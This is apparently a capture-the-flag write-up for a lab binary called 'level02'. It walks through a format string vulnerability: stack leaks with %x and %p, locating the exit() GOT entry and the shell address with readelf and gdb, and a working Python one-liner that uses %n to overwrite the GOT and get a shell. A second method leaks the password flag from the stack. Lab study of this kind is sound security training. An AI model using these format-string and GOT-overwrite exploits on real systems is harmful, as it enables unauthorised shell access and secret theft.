# level02
- ! This binary is an ELF in 64-bit !  
Adresses are 8 bytes long
- RELRO is disabled

## Step 1 : Understand the program

1. The program reads the 41 bytes of the flag in `/home/users/level03/.pass` file and store the flag in `ptr[48]`
2. The program waits for username entry and password entry in `stdin`
3. The program compares password entry to the flag
    - If equal: Prints `Greetings` and run a shell
    - If not equal: Prints the raw username string and `exit(1)`. __Here is the vulnerability: Format String Vuln__

## Step 2

Leak the stack to find somethings interesting

```console
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAABBBB %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: CCCCCCCC
*****************************************
AAAABBBB ffffe4c0 0 43 2a2a2a2a 2a2a2a2a ffffe6b8 f7ff9a08 43434343 0 0 0 0 does not have access!
```

Yeah ! We access to the password buffer thanks to the the __8th__ specifer `%x`.

### Solution
Since the program exit if the password is incorrect, we can make a ROP attack by changing the address of `exit()` in the __GOT__ by the address where the program run a shell. 

> Do it by the specifier `%n`. This specifier writes the number of characters written so far to the address of the specified parameter on the stack. In our case, the specified parameter will be password buffer filled with the address of `exit()` entry of the __GOT__.

## Step 3

Find the address of the __GOT__ where the address of `exit()` is stored
```bash
readelf -r level02 | grep exit
```
```console
000000601228  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 exit + 0
```

The __GOT__ stores the address of `exit()` at `0x601228`

## Step 4
Find the address where the shell is run in the program
```console
$ gdb -q level02
Reading symbols from /home/users/level02/level02...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   [...]
   0x0000000000400a78 <+612>:	mov    %rax,%rdi
   0x0000000000400a7b <+615>:	mov    $0x0,%eax
   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:	mov    $0x0,%eax
   0x0000000000400a94 <+640>:	leaveq
   [...]
End of assembler dump.
(gdb) b *main
(gdb) r
(gdb) jump *main+625
Continuing at 0x400a85.
$ whoami
level02
```

> We have a shell at `0x400a85`

## Exploit
```bash
(python -c 'print "%4196997p" + "%8$n" + "\n" + "\x60\x12\x28"[::-1] '; cat) | /home/users/level02/level02
```

> 4196997 is equal to 0x400a85 (address of the shell). We write in decimal because `%n` specifier take a int pointer

## Other solution
```console
./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %21$p%22$p%23$p%24$p%25$p%26$p%27$p
--[ Password:
*****************************************
(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil) does not have access!
```
> At the 22th specifier, we access to the `ptr` buffer which contain the flag.

> Remember: all the flag have a size of 40 bytes

Now we have to

- Remove the 0x
- Split into 5 blocks --> 5 blocks of 8 bytes = 40 bytes
- Convert to ASCII
- Revert endian